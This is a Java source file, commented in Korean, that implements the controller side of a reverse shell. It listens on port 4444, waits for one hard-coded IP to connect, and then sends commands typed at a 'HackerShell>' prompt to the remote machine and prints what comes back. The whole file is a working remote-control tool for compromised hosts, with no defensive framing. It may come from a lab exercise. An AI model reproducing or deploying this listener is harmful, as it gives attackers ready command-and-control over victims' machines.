import java.io.*;
import java.net.*;
import java.util.Scanner;

public class Server1 {
    public static void main(String[] args) {
        // 여기서 직접 연결할 클라이언트 IP를 지정해!
//        String targetClientIP = "10.96.120.75"; // 여기에 연결하고 싶은 클라이언트 IP 직접 입력
        String targetClientIP = "192.168.117.1"; // 여기에 연결하고 싶은 클라이언트 IP 직접 입력
        int port = 4444;

        try {
            // 서버 소켓 생성 (자기 자신의 포트에서 대기)
            ServerSocket serverSocket = new ServerSocket(port);
            System.out.println("🌟 서버가 " + port + "번 포트에서 대기 중... 🌟");

            // 클라이언트 연결 대기
            System.out.println("🔍 특정 IP의 클라이언트 연결을 기다리는 중: " + targetClientIP);
            Socket clientSocket = null;

            while (true) {
                Socket tempSocket = serverSocket.accept();
                String connectedIP = tempSocket.getInetAddress().getHostAddress();

                // 원하는 IP인지 확인
                if (connectedIP.equals(targetClientIP)) {
                    System.out.println("🎉 목표 클라이언트가 연결되었어!: " + connectedIP);
                    clientSocket = tempSocket;
                    break;
                } else {
                    System.out.println("❌ 다른 IP에서 연결 시도: " + connectedIP + " (무시됨)");
                    tempSocket.close();
                }
            }

            // 입출력 스트림 설정
            BufferedReader clientReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            PrintWriter clientWriter = new PrintWriter(clientSocket.getOutputStream(), true);
            Scanner serverScanner = new Scanner(System.in);

            // 클라이언트 출력 스레드
            Thread clientOutputThread = new Thread(() -> {
                try {
                    String line;
                    while ((line = clientReader.readLine()) != null) {
                        System.out.println(line);
                    }
                } catch (IOException e) {
                    System.out.println("💔 클라이언트 연결이 끊겼어: " + e.getMessage());
                }
            });
            clientOutputThread.start();

            // 명령어 입력 및 전송
            System.out.println("\n🔥 리버스 쉘 준비 완료! 명령어를 입력해줘! 🔥");
            System.out.println("👉 종료하려면 'exit'을 입력해!");

            String command;
            while (true) {
                System.out.print("HackerShell> ");
                command = serverScanner.nextLine();

                if (command.equalsIgnoreCase("exit")) {
                    clientOutputThread.interrupt();
                    break;
                }

                clientWriter.println(command);
            }

            System.out.println("서버를 종료합니다...");
            serverScanner.close();
            clientSocket.close();
            serverSocket.close();

        } catch (IOException e) {
            System.err.println("❌ 서버 오류: " + e.getMessage());
            e.printStackTrace();
        }
    }
}